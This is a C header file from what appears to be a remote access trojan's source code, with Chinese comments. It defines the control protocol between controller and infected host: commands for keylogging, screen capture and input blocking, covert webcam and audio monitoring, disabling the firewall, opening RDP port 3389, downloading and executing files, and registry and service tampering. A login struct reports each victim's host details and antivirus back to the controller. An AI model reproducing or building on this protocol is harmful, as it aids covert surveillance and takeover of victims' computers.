#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
};

enum
{
	COMMAND_LIST_FILES = 1,			// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
	COMMAND_FILES_SEARCH_START,     // 搜索文件
	COMMAND_FILES_SEARCH_STOP,      // 停止搜索
	COMMAND_MOVE_DIRECTORY,         // 移动文件夹
	COMMAND_MOVE_FILE,              // 移动文件

	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_SEARCH_FILE_LIST,         // 搜索出来的文件
	TOKEN_SEARCH_FILE_FINISH,       // 全部搜索完成
};

enum
{

	COMMAND_AERO_DISABLE = 1,			// 禁用桌面合成(Aero)
	COMMAND_AERO_ENABLE,			// 启用桌面合成(Aero)
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版


	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容	
};

enum
{
	COMMAND_KEYBOARD_OFFLINE = 1,	// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容
	COMMAND_SEND_KEYBOARD,          // 获取键盘记录内容

	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
};

enum
{
	COMMAND_PROXY_CONNECT= 1, //socket5代理
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_DATA,

	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	TOKEN_PROXY_BIND_RESULT
};

enum
{
	COMMAND_PSLIST = 1,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_SSLIST,                 // 用户信息
	COMMAND_SOFTWARELIST,
	COMMAND_APPUNINSTALL,
	COMMAND_NSLIST,

	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_KILLPROCESS_WINDOW,     // 关闭进程(窗口)
	COMMAND_WINDOW_CLOSE,           // 窗口关闭


	COMMAND_STOP_FIRE,              // 关防火墙
	COMMAND_3389_PORT,              // 更改3389端口
	COMMAND_OPEN_3389,              // 开启3389
	COMMAND_SEND_TERMSRV,           // 发送双开3389文件

	COMMAND_SHOWVISBLE,             // 显示可视窗口
	COMMAND_SHOWHIDDEN,             // 显示隐藏窗口
	COMMAND_WINDOW_DISABLED,        // 禁用窗口
	COMMAND_WINDOW_ENABLED,         // 启用窗口
	COMMAND_WINDOW_CHANGE_TITLE,    // 更改标题
	COMMAND_WINDOW_TEST,            // 窗口隐藏、还原、最大化、最小化

	COMMAND_RUN,					//启动项
	//
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_SSLIST,                   // 系统信息
	TOKEN_SOFTWARE,
	TOKEN_NSLIST,


	TOKEN_GET_TERMSRV,              // XP系统获取双开3389文件
	TOKEN_TERMSRV_OK,               // 双开3389成功

	TOKEN_RUN,						//启动项
};

enum
{
	COMMAND_DELETESERVERICE = 100,       // 删除服务
	COMMAND_STARTSERVERICE,              // 启动服务
	COMMAND_STOPSERVERICE,               // 停止服务
	COMMAND_PAUSESERVERICE,              // 暂停服务
	COMMAND_CONTINUESERVERICE,           // 继续服务
	COMMAND_AUTOSERVERICE,
	COMMAND_HANDSERVERICE,
	COMMAND_DISABLESERVERICE,
};

enum
{
	COMMAND_REG_FIND = 1,               //查询该项  
	COMMAND_REG_DELPATH,            //删除项
	COMMAND_REG_CREATEPATH,         //创建项
	COMMAND_REG_DELKEY,             //删除键
	COMMAND_REG_CREATKEY,           //创建键


	TOKEN_REG_PATH,                 // 发送注册表项名
	TOKEN_REG_KEY,                  // 发送键名
	TOKEN_REG_OK,                   // 执行成功
	TOKEN_REG_NO,                   // 执行失败
};

enum
{
	COMMAND_WEBCAM_RESIZE = 1,    		// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_EXCEPTION1,				// 传输发生异常，需要重新传输

	TOKEN_WEBCAM_DIB,			    	// 摄像头的图像数据
};

enum
{
	COMMAND_AUDIO_DATE = 1,             // 发送本地语音数据
	COMMAND_AUDIO_CHANGER,          // 更改输入设备
	COMMAND_AUDIO_CHANGER_LINES,    // 更换输入声道
	COMMAND_AUDIO_COREAUDIOAPIS,    // 启动WIn7模式
	COMMAND_AUDIO_CHANGER_WAVETAG,
	COMMAND_AUDIO_ENUM_RECORD_DEVICE,
	COMMAND_AUDIO_SET_DEFAULT_DEVICE,
	COMMAND_AUDIO_ENABLED_DEVICE,
	COMMAND_AUDIO_DISABLE_DEVICE,


	TOKEN_AUDIO_DATA,               // 音频数据
	TOKEN_AUDIO_COREDATA,
	TOKEN_AUDIO_CHANGE_FINISH,      // 换道成功
	TOKEN_AUDIO_SHOW_DEVICE,

};

enum
{
	// 控制端发出的命令
	COMMAND_NEXT = 100,				 // 下一步(控制端已经打开对话框)
	COMMAND_REPLAY_HEARTBEAT,		 // 回复心跳包
	COMMAND_DOWN_EXEC,               // 下载执行
	COMMAND_SESSION,				 // 会话管理（注销，重启，关机）
	COMMAND_REMOVE,					 // 卸载服务
	COMMAND_RENAME_REMARK,			 // 重命名备注
	COMMAND_CHANGE_GROUP,			 // 更改分组
	COMMAND_SCREEN_SPY,			     // 屏幕监控
	COMMAND_KEYBOARD,				 // 键盘记录
	COMMAND_LIST_DRIVE,				 //  文件管理
	COMMAND_PROXY_MAP,				 // proxyMap
	COMMAND_SYSTEM0,                 // 系统管理
	COMMAND_SYSTEM1,                 // 系统管理
	COMMAND_SYSTEM2,                 // 系统管理
	COMMAND_SYSTEM3,                 // 系统管理
	COMMAND_SYSTEM4,                 // 系统管理
	COMMAND_SYSTEM5,                 // 系统管理
	COMMAND_SERVICE_MANAGER,	     // 服务管理	
	COMMAND_REGEDIT,                 // 注 册 表
	COMMAND_WEBCAM,				     // 摄像头监控
	COMMAND_AUDIO,                   // 语音监听	
	//附加功能
	COMMAND_ReStart_Exp,             //重启Exp
	COMMAND_Run,                       //Run
	COMMAND_Screensp,                   //win10半屏
/////////////////////////////////////////////////////////////////////////////////////////

	// 服务端发出的标识
	TOKEN_LOGIN = 200,				// 上线包
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_BITMAPINFO,				// 屏幕监控（屏幕查看的BITMAPINFO）
	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_DRIVE_LIST,				// 文件管理
	TOKEN_PROXY_START,              // 代理映射开始
	TOKEN_PSLIST,					// 系统管理(第一个窗口)
	TOKEN_SERVICE_LIST,             // 服务列表
	TOKEN_REGEDIT,                  // 注册表开始
	TOKEN_WEBCAM_BITMAPINFO,		// 视频监控开始
	TOKEN_AUDIO_START,				// 开始语音监听
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUClockMhz;	// CPU频率
	int				nCPUNumber;		// CPU核数
	IN_ADDR	    	IPAddress;	    // 存储32位的IPv4的地址数据结构
	char			HostName[256];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	DWORD			Speed;		    // 网卡
	DWORD			MemSize;		// 内存大小
	DWORD			DriverSize;		// 硬盘容量
	char			UpGroup[50];	// 上线分组
	char			RunTime[32];	// 运行时间
	char			szVersion[32];	// 上线版本
	char            Virus[50];
	BOOL            bIs64;          // 32位or 64位 1为64 0为32     
	char			MarkTime[50];   // 服务端安装时间
}LOGININFO;



#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			2048 * 50 // 最大发送数据长度
#define MAX_RECV_BUFFER			2048 * 50 // 最大接收数据长度

#endif // !defined(AFX_MACROS_H_INCLUDED)